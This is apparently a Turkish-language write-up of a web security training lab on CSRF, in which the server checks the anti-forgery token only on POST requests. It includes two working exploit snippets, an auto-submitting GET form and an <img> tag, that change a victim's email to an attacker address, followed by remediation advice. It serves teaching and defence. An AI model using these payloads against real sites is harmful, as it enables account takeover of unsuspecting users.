# CSRF #3 — Token validation depends on request method

- **Seviye:** Practitioner
- **Sınıf:** CSRF (token bypass)
- **Yöntem:** Körleme (Repeater deneyi + exploit server)
- **Araç:** Burp Repeater + exploit server

---

## Bu lab neyi öğretti?

Token **var** ve POST'ta gerçekten doğrulanıyor — yani form "korumalı" görünüyor. Ama sunucu
token'ı **yalnızca POST isteğinde** kontrol ediyor. İsteği **GET'e çevirince** doğrulama devreye
girmiyor → token'ı hiç göndermeden geçiyorsun.

## Koşullu savunma ailesi (zincir)

- **CSRF #2:** koşul = "token mevcut" → saldırgan token'ı **silerek** bozdu.
- **CSRF #3 (bu):** koşul = "method POST" → saldırgan method'u **GET'e çevirerek** bozdu.
- **Genel ilke:** Bir savunma **koşullu** uygulanıyorsa, saldırgan o koşulu bozarak atlar.
  Koşul ne olursa olsun (token varlığı, HTTP method, Content-Type...) mantık aynı.

## İki deney (Repeater)

| Deney | Yapılan | Sonuç | Kanıt |
|-------|---------|-------|-------|
| **A** | POST bırak, `csrf`'i boz | `Invalid token` | POST'ta token **doğrulanıyor** |
| **B** | Method POST→GET, `csrf`'i sil | **HTTP 302** (redirect) | GET'te token **doğrulanmıyor** → zafiyet |

> **Kritik okuma dersi:** Repeater'da "görünür bir şey olmaması" başarısızlık değildir.
> Yanıtın **status code**'u gerçeği söyler: **302/200 = kabul**, **400 = ret**. Gözünü status line'a dik.
> (Bu lab'da B'de 302 geldi → "birşey olmadı" sandığım şey aslında sessiz başarıydı.)

## Exploit

Method GET, token yok. Dünkü exploit ile aynı iskelet, tek fark `method="GET"`:

```html
<html>
  <body>
    <form action="https://<lab>.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="hacked@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### Daha zarif: `<img>` ile (form bile gerekmez)
GET isteği URL'den ibarettir ve tarayıcı birçok elementi otomatik GET ile yükler:
```html
<img src="https://<lab>.web-security-academy.net/my-account/change-email?email=hacked@evil.com">
```
Kurban sayfayı açar → tarayıcı "resmi" çekmek için o URL'e **cookie'yle** GET atar → e-posta değişir.
Resim yüklenmez ama saldırı çoktan olmuştur.

## Neden state-changing işlem GET ile yapılmamalı? (kök ders)

1. **Tetiklemesi çok kolay:** `<img>`, `<iframe>`, `<script>`, link, prefetch... hepsi otomatik GET.
   Saldırganın form'a/JS'e bile ihtiyacı yok.
2. **Parametreler URL'de sızar:** sunucu log'ları, tarayıcı geçmişi, proxy log'ları, Referer header.
3. **Semantik:** GET "güvenli/okuma" olmalı (idempotent); hiçbir şeyi değiştirmemeli.

## İşletim notu (bu lab'da takıldığım yer)

Exploit server'da **Head** ve **Body** ayrı kutular:
- **Head:** HTTP yanıt başlıkları — ilk satır mutlaka `HTTP/1.1 200 OK` olmalı.
- **Body:** HTML içerik.

HTML'i yanlışlıkla Head'e koyunca `Invalid HTTP response header: no status code` hatası aldım.
Çözüm: status line Head'de, HTML Body'de.

## Remediation (defender tarafı)

1. **Token'ı HER method'da zorunlu kıl:** Doğrulama HTTP method'a bağlı olmamalı. GET, POST, PUT —
   hepsinde token kontrol edilmeli (ya da state-changing işlemlere GET'i tamamen kapat).
2. **State-changing işlemler yalnızca POST/PUT/DELETE** olmalı, asla GET.
3. **SameSite cookie** (`Lax`/`Strict`): cross-site isteğe cookie'yi göndermez.
4. **Framework'ün CSRF korumasını global uygula**, method bazlı istisna açma.

## Köşe taşı

> Bir savunma yalnızca belli bir method'ta devreye giriyorsa, saldırgan method'u değiştirir.
> Gerçek güvenlik method'tan **bağımsız** olmalı: "sadece POST'ta kontrol et" değil, "her
> durumda kontrol et, GET ile zaten değişiklik kabul etme."
